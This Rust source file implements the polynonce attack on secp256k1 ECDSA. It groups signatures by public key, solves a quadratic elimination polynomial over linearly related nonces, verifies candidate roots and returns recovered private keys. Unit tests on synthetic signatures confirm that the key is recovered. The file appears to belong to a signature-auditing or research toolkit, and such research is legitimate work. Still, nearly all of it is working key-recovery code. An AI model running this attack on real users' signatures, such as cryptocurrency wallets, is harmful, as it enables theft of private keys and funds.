//! Polynonce attack implementation
//!
//! Detects polynomial relationships between ECDSA nonces and recovers private keys.

use super::*;
use crate::math::scalar_to_decimal_string;
use crate::signature::group_by_pubkey_ordered;
use k256::elliptic_curve::ff::PrimeField;
use k256::Scalar;

/// Polynonce attack for detecting and exploiting polynomial nonce relationships.
pub struct PolynonceAttack {
    degree: usize,
}

impl PolynonceAttack {
    pub fn new(degree: usize) -> Self {
        Self { degree }
    }

    /// Solves the quadratic equation Ax² + Bx + C = 0 over the scalar field.
    /// Returns all roots found (0, 1, or 2 roots).
    fn solve_quadratic(a: &Scalar, b: &Scalar, c: &Scalar) -> Vec<Scalar> {
        // Handle degenerate case: A = 0 (linear equation Bx + C = 0)
        if a.is_zero().into() {
            if b.is_zero().into() {
                return Vec::new(); // No solution or infinite solutions
            }
            // x = -C/B
            let b_inv = b.invert();
            if bool::from(b_inv.is_none()) {
                return Vec::new();
            }
            return vec![b_inv.unwrap() * (-*c)];
        }

        // Discriminant: Δ = B² - 4AC
        let four = Scalar::from(4u64);
        let two = Scalar::from(2u64);
        let discriminant = *b * *b - four * *a * *c;

        // Try to find sqrt(Δ)
        let sqrt_disc = match modular_sqrt(&discriminant) {
            Some(s) => s,
            None => return Vec::new(), // No roots (discriminant is not a quadratic residue)
        };

        // x = (-B ± √Δ) / 2A
        let two_a = two * *a;
        let two_a_inv = two_a.invert();
        if bool::from(two_a_inv.is_none()) {
            return Vec::new();
        }
        let two_a_inv = two_a_inv.unwrap();

        let neg_b = -*b;
        let root1 = (neg_b + sqrt_disc) * two_a_inv;
        let root2 = (neg_b - sqrt_disc) * two_a_inv;

        if root1 == root2 {
            vec![root1]
        } else {
            vec![root1, root2]
        }
    }

    /// Builds the elimination polynomial coefficients and finds roots.
    ///
    /// For linear nonce relation k_i = a + b*k_{i-1}, the elimination condition is:
    /// (k_1 - k_0)(k_3 - k_2) = (k_2 - k_1)²
    ///
    /// Each k_i(d) = z_i*s_i⁻¹ + r_i*s_i⁻¹*d is linear in d.
    /// Expanding gives a quadratic equation in d.
    fn find_elimination_poly_roots(&self, sigs: &[Signature]) -> Vec<Scalar> {
        assert!(sigs.len() >= 4, "Need at least 4 signatures");

        // Compute coefficients c_i0 and c_i1 for k_i(d) = c_i0 + c_i1*d
        let coeffs: Vec<(Scalar, Scalar)> = sigs
            .iter()
            .take(4)
            .map(|sig| {
                let s_inv = sig.s.invert();
                let s_inv = Option::<Scalar>::from(s_inv).expect("s should be invertible");
                let c0 = sig.z * s_inv; // z_i * s_i⁻¹
                let c1 = sig.r * s_inv; // r_i * s_i⁻¹
                (c0, c1)
            })
            .collect();

        // Differences: diff_i = k_{i+1} - k_i = (c_{i+1,0} - c_{i,0}) + (c_{i+1,1} - c_{i,1})*d
        // Let diff_i = a_i + b_i*d
        let (a0, b0) = (coeffs[1].0 - coeffs[0].0, coeffs[1].1 - coeffs[0].1); // k_1 - k_0
        let (a1, b1) = (coeffs[2].0 - coeffs[1].0, coeffs[2].1 - coeffs[1].1); // k_2 - k_1
        let (a2, b2) = (coeffs[3].0 - coeffs[2].0, coeffs[3].1 - coeffs[2].1); // k_3 - k_2

        // Elimination: (a0 + b0*d)(a2 + b2*d) - (a1 + b1*d)² = 0
        //
        // Expanding:
        // a0*a2 + (a0*b2 + a2*b0)*d + b0*b2*d²
        // - (a1² + 2*a1*b1*d + b1²*d²) = 0
        //
        // Collecting:
        // (b0*b2 - b1²)*d² + (a0*b2 + a2*b0 - 2*a1*b1)*d + (a0*a2 - a1²) = 0
        let two = Scalar::from(2u64);

        let coeff_a = b0 * b2 - b1 * b1; // coefficient of d²
        let coeff_b = a0 * b2 + a2 * b0 - two * a1 * b1; // coefficient of d
        let coeff_c = a0 * a2 - a1 * a1; // constant term

        Self::solve_quadratic(&coeff_a, &coeff_b, &coeff_c)
    }

    /// Verifies that the given private key d produces nonces matching signature r values.
    fn verify_key(&self, d: &Scalar, sigs: &[Signature]) -> bool {
        use k256::elliptic_curve::sec1::ToEncodedPoint;
        use k256::{AffinePoint, ProjectivePoint};

        let sig = &sigs[0];

        // Compute k = (z + r*d) / s
        let s_inv = sig.s.invert();
        let s_inv = match Option::<Scalar>::from(s_inv) {
            Some(v) => v,
            None => return false,
        };
        let k = (sig.z + sig.r * d) * s_inv;

        // Compute R = k*G
        let kg = ProjectivePoint::GENERATOR * k;
        let kg_affine: AffinePoint = kg.into();
        let kg_point = kg_affine.to_encoded_point(false);
        let x_bytes = match kg_point.x() {
            Some(x) => x,
            None => return false,
        };

        // r should equal x coordinate of k*G (mod n)
        let computed_r = match Scalar::from_repr_vartime(*x_bytes) {
            Some(r) => r,
            None => return false,
        };

        computed_r == sig.r
    }

    /// Checks if d is a root of the elimination polynomial.
    pub fn is_root_of_elimination_poly(&self, sigs: &[Signature], d: &Scalar) -> bool {
        assert!(sigs.len() >= 4, "Need at least 4 signatures");

        // Compute coefficients
        let coeffs: Vec<(Scalar, Scalar)> = sigs
            .iter()
            .take(4)
            .map(|sig| {
                let s_inv = Option::<Scalar>::from(sig.s.invert()).expect("s invertible");
                (sig.z * s_inv, sig.r * s_inv)
            })
            .collect();

        // Compute k_i(d) = c_i0 + c_i1*d
        let k: Vec<Scalar> = coeffs.iter().map(|(c0, c1)| *c0 + *c1 * d).collect();

        // Check: (k_1 - k_0)(k_3 - k_2) == (k_2 - k_1)²
        let diff0 = k[1] - k[0];
        let diff1 = k[2] - k[1];
        let diff2 = k[3] - k[2];

        let lhs = diff0 * diff2;
        let rhs = diff1 * diff1;

        lhs == rhs
    }

    /// Returns the degree of the elimination polynomial (always 2 for linear case).
    pub fn elimination_poly_degree(&self, _sigs: &[Signature]) -> usize {
        2 // Quadratic for linear nonce relation
    }
}

impl Attack for PolynonceAttack {
    fn name(&self) -> &'static str {
        "polynonce"
    }

    fn min_signatures(&self) -> usize {
        self.degree + 3
    }

    fn detect(&self, signatures: &[Signature]) -> Vec<Vulnerability> {
        group_by_pubkey_ordered(signatures)
            .into_iter()
            .filter(|g| g.signatures.len() >= self.min_signatures())
            .filter(|g| g.pubkey.is_some())
            .map(|group| Vulnerability {
                attack_type: self.name().to_string(),
                group,
            })
            .collect()
    }

    fn recover(&self, vuln: &Vulnerability) -> Option<RecoveredKey> {
        let sigs = &vuln.group.signatures;
        if sigs.len() < self.min_signatures() {
            return None;
        }

        let roots = self.find_elimination_poly_roots(sigs);

        for d in roots {
            if self.verify_key(&d, sigs) {
                return Some(RecoveredKey {
                    private_key: d,
                    private_key_decimal: scalar_to_decimal_string(&d),
                    pubkey: vuln.group.pubkey.clone(),
                });
            }
        }

        None
    }
}

/// Computes modular square root using Tonelli-Shanks algorithm.
/// Returns Some(sqrt) if `a` is a quadratic residue, None otherwise.
fn modular_sqrt(a: &Scalar) -> Option<Scalar> {
    use num_bigint::BigUint;
    use num_traits::{One, Zero};

    // Handle zero case
    if a.is_zero().into() {
        return Some(Scalar::ZERO);
    }

    // secp256k1 order n
    let n = BigUint::parse_bytes(
        b"FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141",
        16,
    )
    .unwrap();

    // Convert input to BigUint
    let a_bytes = a.to_bytes();
    let a_big = BigUint::from_bytes_be(&a_bytes);

    // First check if a is a quadratic residue using Euler's criterion
    // a^((n-1)/2) == 1 means a is a QR
    let n_minus_1 = &n - BigUint::one();
    let n_minus_1_div_2 = &n_minus_1 >> 1;

    let euler = a_big.modpow(&n_minus_1_div_2, &n);
    if euler != BigUint::one() {
        return None; // Not a quadratic residue
    }

    // Tonelli-Shanks algorithm
    // Factor n-1 = 2^s * q where q is odd
    let mut q = n_minus_1.clone();
    let mut s = 0u32;
    while (&q & BigUint::one()).is_zero() {
        q >>= 1;
        s += 1;
    }

    // Find a quadratic non-residue z
    // Must search for one since z=2 is a QR for secp256k1 order
    let mut z = BigUint::from(2u64);
    loop {
        let euler_z = z.modpow(&n_minus_1_div_2, &n);
        if euler_z != BigUint::one() {
            break; // Found a non-QR
        }
        z += BigUint::one();
        if z > BigUint::from(1000u64) {
            // Should never happen for a proper prime
            return None;
        }
    }

    // c = z^q mod n
    let mut c = z.modpow(&q, &n);

    // r = a^((q+1)/2) mod n
    let q_plus_1_div_2 = (&q + BigUint::one()) >> 1;
    let mut r = a_big.modpow(&q_plus_1_div_2, &n);

    // t = a^q mod n
    let mut t = a_big.modpow(&q, &n);

    // m = s
    let mut m = s;

    loop {
        if t == BigUint::one() {
            return biguint_to_scalar(&r);
        }

        // Find least i such that t^(2^i) = 1
        let mut i = 1u32;
        let mut temp = (&t * &t) % &n;
        while temp != BigUint::one() && i < m {
            temp = (&temp * &temp) % &n;
            i += 1;
        }

        if i == m {
            return None; // Should not happen if a is a QR
        }

        // b = c^(2^(m-i-1)) mod n
        let mut b = c.clone();
        for _ in 0..(m - i - 1) {
            b = (&b * &b) % &n;
        }

        r = (&r * &b) % &n;
        c = (&b * &b) % &n;
        t = (&t * &c) % &n;
        m = i;
    }
}

/// Converts BigUint to Scalar (mod n).
fn biguint_to_scalar(big: &num_bigint::BigUint) -> Option<Scalar> {
    let bytes = big.to_bytes_be();
    if bytes.len() > 32 {
        return None;
    }
    let mut arr = [0u8; 32];
    let start = 32 - bytes.len();
    arr[start..].copy_from_slice(&bytes);
    Option::<Scalar>::from(Scalar::from_repr(arr.into()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::signature::SignatureInput;

    /// Generates test signatures where nonces follow k_i = a + b*k_{i-1}.
    fn generate_test_sigs_with_linear_nonce(d: Scalar, count: usize) -> Vec<Signature> {
        use k256::elliptic_curve::sec1::ToEncodedPoint;
        use k256::{AffinePoint, ProjectivePoint};

        assert!(count >= 4, "Need at least 4 signatures");

        let a = Scalar::from(100u64);
        let b = Scalar::from(2u64);
        let k0 = Scalar::from(1000u64);

        let mut nonces = Vec::with_capacity(count);
        nonces.push(k0);
        for i in 1..count {
            let k_prev = nonces[i - 1];
            let k_i = a + b * k_prev;
            nonces.push(k_i);
        }

        nonces
            .into_iter()
            .enumerate()
            .map(|(i, k)| {
                let z = Scalar::from((i + 1) as u64);

                let kg = ProjectivePoint::GENERATOR * k;
                let kg_affine: AffinePoint = kg.into();
                let kg_point = kg_affine.to_encoded_point(false);
                let x_bytes = kg_point.x().expect("point should have x coordinate");

                let r = Option::<Scalar>::from(Scalar::from_repr((*x_bytes).into()))
                    .expect("x coordinate should be valid scalar");

                let k_inv = Option::<Scalar>::from(k.invert()).expect("k should be invertible");
                let s = k_inv * (z + r * d);

                Signature {
                    r,
                    s,
                    z,
                    pubkey: Some("02test".to_string()),
                    timestamp: Some(i as u64),
                }
            })
            .collect()
    }

    #[test]
    fn test_modular_sqrt() {
        // Test sqrt of a perfect square
        let x = Scalar::from(16u64);
        let sqrt_x = modular_sqrt(&x).expect("16 should have sqrt");
        assert!(sqrt_x * sqrt_x == x, "sqrt(16)² should equal 16");

        // Test sqrt of zero
        let zero = Scalar::ZERO;
        let sqrt_zero = modular_sqrt(&zero).expect("0 should have sqrt");
        assert!(sqrt_zero == Scalar::ZERO, "sqrt(0) should be 0");
    }

    #[test]
    fn test_solve_quadratic() {
        // Test x² - 5x + 6 = 0, roots are 2 and 3
        let a = Scalar::ONE;
        let b = -Scalar::from(5u64);
        let c = Scalar::from(6u64);

        let roots = PolynonceAttack::solve_quadratic(&a, &b, &c);
        assert_eq!(roots.len(), 2);

        let two = Scalar::from(2u64);
        let three = Scalar::from(3u64);
        assert!(roots.contains(&two) && roots.contains(&three));
    }

    #[test]
    fn test_build_elimination_polynomial() {
        let d_known = Scalar::from(12345u64);
        let sigs = generate_test_sigs_with_linear_nonce(d_known, 4);

        let attack = PolynonceAttack::new(1);

        assert!(
            attack.is_root_of_elimination_poly(&sigs, &d_known),
            "The private key d should be a root"
        );

        let random_d = Scalar::from(99999u64);
        assert!(
            !attack.is_root_of_elimination_poly(&sigs, &random_d),
            "A random value should not be a root"
        );
    }

    #[test]
    fn test_elimination_poly_degree() {
        let d_known = Scalar::from(12345u64);
        let sigs = generate_test_sigs_with_linear_nonce(d_known, 4);

        let attack = PolynonceAttack::new(1);
        let degree = attack.elimination_poly_degree(&sigs);

        assert_eq!(degree, 2, "Elimination polynomial should be quadratic");
    }

    fn make_4_consecutive_sigs(pubkey: &str) -> Vec<Signature> {
        (1..=4)
            .map(|i| {
                Signature::try_from(SignatureInput {
                    r: format!("{}", 100 + i),
                    s: format!("{}", 200 + i),
                    z: format!("{}", 300 + i),
                    pubkey: Some(pubkey.to_string()),
                    timestamp: Some(i as u64),
                })
                .unwrap()
            })
            .collect()
    }

    #[test]
    fn test_polynonce_detection_minimum_4_sigs() {
        let attack = PolynonceAttack::new(1);
        assert_eq!(attack.min_signatures(), 4);

        let sigs = make_4_consecutive_sigs("02abcdef");
        let vulns = attack.detect(&sigs);
        assert_eq!(vulns.len(), 1);
    }

    #[test]
    fn test_polynonce_insufficient_signatures() {
        let attack = PolynonceAttack::new(1);

        let sigs: Vec<Signature> = (1..=3)
            .map(|i| {
                Signature::try_from(SignatureInput {
                    r: format!("{}", 100 + i),
                    s: format!("{}", 200 + i),
                    z: format!("{}", 300 + i),
                    pubkey: Some("02abcdef".to_string()),
                    timestamp: Some(i as u64),
                })
                .unwrap()
            })
            .collect();

        let vulns = attack.detect(&sigs);
        assert!(vulns.is_empty());
    }

    #[test]
    fn test_polynonce_filters_out_none_pubkey() {
        let attack = PolynonceAttack::new(1);

        let sigs: Vec<Signature> = (1..=4)
            .map(|i| {
                Signature::try_from(SignatureInput {
                    r: format!("{}", 100 + i),
                    s: format!("{}", 200 + i),
                    z: format!("{}", 300 + i),
                    pubkey: None,
                    timestamp: Some(i as u64),
                })
                .unwrap()
            })
            .collect();

        let vulns = attack.detect(&sigs);
        assert!(vulns.is_empty());
    }

    #[test]
    fn test_polynonce_multiple_pubkeys_separate_groups() {
        let attack = PolynonceAttack::new(1);

        let mut sigs = make_4_consecutive_sigs("02aaaaaa");
        sigs.extend(make_4_consecutive_sigs("02bbbbbb"));

        let vulns = attack.detect(&sigs);
        assert_eq!(vulns.len(), 2);
    }

    #[test]
    fn test_find_roots_returns_correct_key() {
        let d_known = Scalar::from(12345u64);
        let sigs = generate_test_sigs_with_linear_nonce(d_known, 4);

        let attack = PolynonceAttack::new(1);
        let roots = attack.find_elimination_poly_roots(&sigs);

        assert!(!roots.is_empty(), "Should find at least one root");
        assert!(
            roots.contains(&d_known),
            "Roots should contain the private key"
        );
    }

    #[test]
    fn test_polynonce_key_recovery() {
        use crate::signature::SignatureGroup;

        let d_known = Scalar::from(12345u64);
        let sigs = generate_test_sigs_with_linear_nonce(d_known, 4);

        let attack = PolynonceAttack::new(1);
        let group = SignatureGroup {
            r: sigs[0].r,
            pubkey: Some("02abcdef".to_string()),
            signatures: sigs,
            confidence: 1.0,
        };
        let vuln = Vulnerability {
            attack_type: "polynonce".to_string(),
            group,
        };

        let recovered = attack.recover(&vuln).expect("Should recover private key");
        assert_eq!(recovered.private_key, d_known);
    }
}
